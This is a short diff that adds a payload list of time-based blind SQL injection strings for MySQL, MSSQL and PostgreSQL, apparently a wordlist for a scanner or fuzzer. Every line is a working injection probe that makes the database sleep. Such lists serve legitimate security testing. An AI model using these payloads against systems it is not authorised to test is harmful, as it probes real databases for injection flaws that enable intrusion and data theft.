@@ -1,0 +1,10 @@
+mysql:' AND SLEEP(5)--
+mysql:" AND SLEEP(5)--
+mysql:' OR SLEEP(5)--
+mysql:" OR SLEEP(5)--
+
+mssql:WAITFOR DELAY '0:0:5'--
+mssql:;WAITFOR DELAY '0:0:5'--
+
+postgres:' AND pg_sleep(5)--
+postgres:" AND pg_sleep(5)--
